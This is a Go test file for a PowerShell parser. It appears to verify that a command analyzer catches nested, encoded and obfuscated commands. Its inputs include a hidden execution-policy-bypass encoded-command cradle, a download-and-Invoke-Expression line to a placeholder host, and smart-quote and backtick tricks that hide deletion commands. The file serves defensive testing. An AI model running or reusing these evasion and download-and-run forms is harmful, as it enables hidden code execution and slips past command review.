package psparse

// Review proof tests (s7-pwsh-review). Each subtest asserts the correct
// PowerShell behaviour; a failure reproduces a finding.

import (
	"encoding/base64"
	"fmt"
	"runtime"
	"strings"
	"testing"
	"time"
	"unicode/utf16"
)

// § stands for a backtick in test sources.
func bq(s string) string { return strings.ReplaceAll(s, "§", "`") }

func encPS(s string) string {
	u := utf16.Encode([]rune(s))
	b := make([]byte, 2*len(u))
	for i, c := range u {
		b[2*i], b[2*i+1] = byte(c), byte(c>>8)
	}
	return base64.StdEncoding.EncodeToString(b)
}

func revCmds(src string) []*Command {
	sc, _ := Parse(src, Options{})
	var out []*Command
	WalkCommands(sc, func(c *Command) { out = append(out, c) })
	return out
}

func revLit(e Expr) string {
	s, ok := LiteralString(e)
	if !ok {
		return "<dyn>"
	}
	return fmt.Sprintf("%q", s)
}

func revDesc(c *Command) string {
	var b strings.Builder
	b.WriteString("name=" + revLit(c.Name))
	for _, el := range c.Elements {
		switch e := el.(type) {
		case *Parameter:
			fmt.Fprintf(&b, " -%s", e.Name)
			if e.Colon != nil {
				b.WriteString(":" + revLit(e.Colon))
			}
		case *Arg:
			b.WriteString(" arg=" + revLit(e.Value))
		default:
			fmt.Fprintf(&b, " %T", el)
		}
	}
	return b.String()
}

func revNames(src string) []string {
	var out []string
	for _, c := range revCmds(src) {
		s, ok := LiteralString(c.Name)
		if !ok {
			s = "<dyn>"
		}
		out = append(out, strings.ToLower(s))
	}
	return out
}

func revFirstArg(src string) (Expr, string) {
	cs := revCmds(src)
	if len(cs) == 0 {
		return nil, "no command"
	}
	for _, el := range cs[0].Elements {
		if a, ok := el.(*Arg); ok {
			return a.Value, revDesc(cs[0])
		}
	}
	return nil, revDesc(cs[0])
}

func revNested(src string) string {
	sc, _ := Parse(src, Options{})
	var parts []string
	for _, n := range ExtractNestedScripts(sc) {
		parts = append(parts, fmt.Sprintf("{%s static=%v text=%q reason=%s}", n.Kind, n.Static, n.Text, n.Reason))
	}
	return strings.Join(parts, " ")
}

// TestRevWrongStatic: LiteralString must never report ok=true for a value that
// differs from what PowerShell computes. want=="<dyn>" means ok must be false.
func TestRevWrongStatic(t *testing.T) {
	cases := []struct{ name, src, want string }{
		{"bareword_dollar_mid", `Remove-Item C:\Users\$env:USERNAME\x`, "<dyn>"},
		{"bareword_dollar_brace_mid", `Remove-Item C:\a\${env:X}\b`, "<dyn>"},
		{"bareword_subexpr_mid", `Remove-Item C:\a\$(Get-Date)\b`, "<dyn>"},
		{"bareword_backtick", bq(`Remove-Item C:\fo§o`), `"C:\\foo"`},
		{"fused_single_quote", `Remove-Item C:\Users\'x y'\f`, `"C:\\Users\\x y\\f"`},
		{"fused_glob_operator_lead", `Remove-Item *.ps1`, `"*.ps1"`},
		{"dq_unicode_escape", bq(`Write-Output "§u{72}m"`), `"rm"`},
		{"dq_escape_e", bq(`Write-Output "§e"`), `"\x1b"`},
		{"dq_dollar_digit", `Write-Output "C:\$1\x"`, "<dyn>"},
		{"smart_dq_open", `Remove-Item “C:\x y”`, `"C:\\x y"`},
		{"smart_sq_open", `Remove-Item ‘C:\x y’`, `"C:\\x y"`},
		{"number_hex", `Write-Output 0x10`, `"16"`},
		{"number_add", `Write-Output (1+2)`, `"3"`},
		{"heresq_crlf", "Write-Output @'\r\nabc\r\n'@", `"abc"`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			e, desc := revFirstArg(c.src)
			got := revLit(e)
			if e == nil {
				got = "<none>"
			}
			if got != "<dyn>" && got != c.want {
				t.Errorf("WRONG STATIC: LiteralString=%s want %s  [%s]", got, c.want, desc)
			}
		})
	}
}

func TestRevCommandNameStatic(t *testing.T) {
	cases := []struct{ name, src, want string }{
		{"name_backtick", bq(`Re§move-Item C:\x`), "remove-item"},
		{"name_backtick_iex", bq(`i§ex 'whoami'`), "i\x1bx"}, // pwsh 7.7: `e is ESC even in a name
		{"name_smart_quote", `& “Remove-Item” C:\x`, "remove-item"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			n := revNames(c.src)
			if len(n) == 0 || (n[0] != "<dyn>" && n[0] != c.want) {
				t.Errorf("WRONG STATIC NAME: names=%q want %q", n, c.want)
			}
		})
	}
}

// TestRevMissedCommands: WalkCommands must reach every command PowerShell would run.
func TestRevMissedCommands(t *testing.T) {
	cases := []struct {
		name, src string
		want      []string
	}{
		{"smart_dq_close", `Write-Host "a”; Remove-Item C:\x; "b"`, []string{"write-host", "remove-item"}},
		{"smart_sq_close", `Write-Host 'a’; Remove-Item C:\x; 'b'`, []string{"write-host", "remove-item"}},
		{"dot_arg", `Get-ChildItem . -Recurse | Remove-Item -Force`, []string{"get-childitem", "remove-item"}},
		{"digit_led_name", `7z a out.zip C:\secret`, []string{"7z"}},
		{"digit_led_name_exe", `7z.exe a out.zip C:\secret`, []string{"7z.exe"}},
		{"param_default", `param($p = (Remove-Item C:\x))`, []string{"remove-item"}},
		{"sb_param_default", `& { param($p = $(Remove-Item C:\x)) $p }`, []string{"<dyn>", "remove-item"}},
		{"param_attr_scriptblock", `param([ValidateScript({Remove-Item C:\x})]$p)`, []string{"remove-item"}},
		{"hashtable_key", `@{ (Remove-Item C:\x) = 1 }`, []string{"remove-item"}},
		{"switch_with_option", `switch -regex (Get-Item x) { 'a' { Remove-Item y } }`, []string{"get-item", "remove-item"}},
		{"class_method", `class A { [void] M() { Remove-Item C:\x } }`, []string{"remove-item"}},
		{"stop_parsing_pipe", `cmd /c --% echo hi | Remove-Item C:\x`, []string{"cmd", "remove-item"}},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := revNames(c.src)
			if strings.Join(got, ",") != strings.Join(c.want, ",") {
				var ds []string
				for _, cm := range revCmds(c.src) {
					ds = append(ds, revDesc(cm))
				}
				t.Errorf("commands=%q want %q  [%s]", got, c.want, strings.Join(ds, " | "))
			}
		})
	}
}

// TestRevNested: ExtractNestedScripts must decode/resolve, or say Static=false.
func TestRevNested(t *testing.T) {
	payload := "Remove-Item C:\\x"
	b := encPS(payload)
	type tc struct{ name, src, wantKind, wantText string }
	cases := []tc{
		{"enc_prefix", "powershell -enc " + b, KindEncodedCommand, payload},
		{"encodedc_prefix", "powershell -EncodedC " + b, KindEncodedCommand, "<dyn>"}, // abbreviation: outside the tested host shapes
		{"classic_cradle", "powershell -NoP -NonI -W Hidden -Exec Bypass -Enc " + b, KindEncodedCommand, payload},
		{"exec_bypass_command_pos", "powershell -ExecutionPolicy Bypass -File x.ps1", "", ""},
		{"slash_enc", "powershell /enc " + b, KindEncodedCommand, "<dyn>"},  // /enc: outside the tested host shapes
		{"endash_enc", "powershell –enc " + b, KindEncodedCommand, "<dyn>"}, // en-dash switch: outside the tested host shapes
		{"command_rest_args", `powershell -Command Remove-Item C:\x`, KindPowerShellCommand, payload},
		{"command_prefix_com", `powershell -com "Remove-Item C:\x"`, KindPowerShellCommand, "<dyn>"}, // -com: outside the tested host shapes
		{"host_full_path", `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -EncodedCommand ` + b, KindEncodedCommand, payload},
		{"host_call_op_full_path", `& "C:\Program Files\PowerShell\7\pwsh.exe" -c "Remove-Item C:\x"`, KindPowerShellCommand, payload},
		{"iex_pipeline_literal", `'Remove-Item C:\x' | iex`, KindIEXLiteral, payload},
		{"iex_pipeline_dynamic", `(New-Object Net.WebClient).DownloadString('http://h/a') | Invoke-Expression`, KindIEXLiteral, "<dyn>"},
		{"start_alias", "start powershell -ArgumentList '-enc','" + b + "'", KindStartProcessArgs, "<dyn>"},
		{"start_process_enc_prefix", "Start-Process powershell -ArgumentList '-enc','" + b + "'", KindStartProcessArgs, "<dyn>"},
		{"start_process_noprofile_enc", "Start-Process powershell -ArgumentList '-NoProfile','-EncodedCommand','" + b + "'", KindStartProcessArgs, "<dyn>"},
		{"scriptblock_full_type", `[System.Management.Automation.ScriptBlock]::Create('Remove-Item C:\x')`, KindScriptBlockCreate, payload},
		{"cmd_c_rest", `cmd /c del C:\x`, KindCmdC, `del C:\x`},
		{"cmd_full_path", `C:\Windows\System32\cmd.exe /c "del C:\x"`, KindCmdC, `del C:\x`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			sc, _ := Parse(c.src, Options{})
			ns := ExtractNestedScripts(sc)
			if c.wantKind == "" {
				// no -Command/-EncodedCommand: must not invent a static script from a parameter value
				for _, n := range ns {
					if n.Static && n.Text != "x.ps1" {
						t.Errorf("WRONG STATIC nested script invented: %s", revNested(c.src))
					}
				}
				return
			}
			for _, n := range ns {
				if c.wantText == "<dyn>" && !n.Static {
					return
				}
				if n.Static && n.Text == c.wantText {
					return
				}
			}
			bad := ""
			for _, n := range ns {
				if n.Static {
					bad = " (WRONG STATIC)"
				}
			}
			t.Errorf("want %s %q; got [%s]%s", c.wantKind, c.wantText, revNested(c.src), bad)
		})
	}
}

// TestRevSuperlinear measures growth on inputs not in TestNoSuperlinearBlowup.
func TestRevSuperlinear(t *testing.T) {
	nestStr := func(d int) string {
		s := "x"
		for i := 0; i < d; i++ {
			s = "\"$(" + s + ")\""
		}
		return "Write-Output " + s
	}
	gens := map[string]func(int) string{
		"nested_expandable_strings": nestStr,
		"nested_here_strings": func(d int) string {
			s := "x"
			for i := 0; i < d; i++ {
				s = "@\"\n$(" + s + ")\n\"@"
			}
			return "Write-Output " + s
		},
		"unary_chain":  func(d int) string { return "(" + strings.Repeat("-", d) + "1)" },
		"not_chain":    func(d int) string { return "(" + strings.Repeat("!", d) + "1)" },
		"cast_chain":   func(d int) string { return "(" + strings.Repeat("[int]", d) + "1)" },
		"bnot_chain":   func(d int) string { return "(" + strings.Repeat("-bnot ", d) + "1)" },
		"control_kw":   func(d int) string { return strings.Repeat("if ", d) + "x" },
		"brace_in_str": func(d int) string { return strings.Repeat("\"$($(", d) },
	}
	for name, g := range gens {
		var prev time.Duration
		for _, d := range []int{500, 1000, 2000, 4000} {
			src := g(d)
			var ms0, ms1 runtime.MemStats
			runtime.GC()
			runtime.ReadMemStats(&ms0)
			st := time.Now()
			sc, _ := Parse(src, Options{})
			_ = ExtractNestedScripts(sc)
			el := time.Since(st)
			runtime.ReadMemStats(&ms1)
			ratio := 0.0
			if prev > 0 {
				ratio = float64(el) / float64(prev)
			}
			t.Logf("%-26s depth=%5d len=%7d time=%10v alloc=%8dKB x%.1f", name, d, len(src), el, (ms1.TotalAlloc-ms0.TotalAlloc)/1024, ratio)
			prev = el
		}
	}
}

// TestRevDeepStack checks inputs within the 1 MiB cap that recurse without the depth guard.
func TestRevDeepStack(t *testing.T) {
	nest := func(d int) string {
		var b strings.Builder
		b.WriteString("Write-Output ")
		for i := 0; i < d; i++ {
			b.WriteString("\"$(")
		}
		b.WriteString("x")
		for i := 0; i < d; i++ {
			b.WriteString(")\"")
		}
		return b.String()
	}
	for _, d := range []int{8000} {
		src := nest(d)
		st := time.Now()
		_, _ = Parse(src, Options{})
		t.Logf("nested strings depth=%d len=%d time=%v", d, len(src), time.Since(st))
	}
	src := "(" + strings.Repeat("-", 900000) + "1)"
	st := time.Now()
	_, _ = Parse(src, Options{})
	t.Logf("unary chain len=%d time=%v", len(src), time.Since(st))
}

var revBenchInputs = []string{
	`Get-ChildItem -Path C:\Users\me\project -Recurse -Filter *.ps1 | Select-String -Pattern 'TODO' | Out-File C:\tmp\todo.txt`,
	`powershell -NoProfile -Command "Remove-Item -Recurse -Force $env:TEMP\build; New-Item -ItemType Directory C:\out"`,
	`git status; npm run build 2>&1 | Tee-Object -FilePath build.log`,
	`$h = @{ Path = 'C:\x'; Force = $true }; if (Test-Path $h.Path) { Remove-Item @h } else { Write-Host "missing $($h.Path)" }`,
}

func BenchmarkRevParse(b *testing.B) {
	for i, src := range revBenchInputs {
		b.Run(fmt.Sprintf("in%d_len%d", i, len(src)), func(b *testing.B) {
			b.ReportAllocs()
			for n := 0; n < b.N; n++ {
				sc, _ := Parse(src, Options{})
				_ = ExtractNestedScripts(sc)
			}
		})
	}
}

func FuzzRevAdapter(f *testing.F) {
	for _, s := range fuzzSeeds {
		f.Add(s)
	}
	for _, s := range revBenchInputs {
		f.Add(s)
	}
	f.Add("powershell -enc " + encPS("Remove-Item C:\\x"))
	f.Add(`'x' | iex; [scriptblock]::Create("a$b")`)
	f.Fuzz(func(t *testing.T, s string) {
		sc, _ := Parse(s, Options{})
		WalkCommands(sc, func(c *Command) {
			LiteralString(c.Name)
			for _, el := range c.Elements {
				if a, ok := el.(*Arg); ok {
					LiteralString(a.Value)
				}
			}
		})
		for _, n := range ExtractNestedScripts(sc) {
			if n.Static && n.Reason != "" {
				t.Fatalf("static with reason")
			}
			if !n.Static && n.Reason == "" {
				t.Fatalf("dynamic nested with no reason: %+v", n)
			}
			if n.Static {
				_, _ = Parse(n.Text, Options{})
			}
		}
	})
}
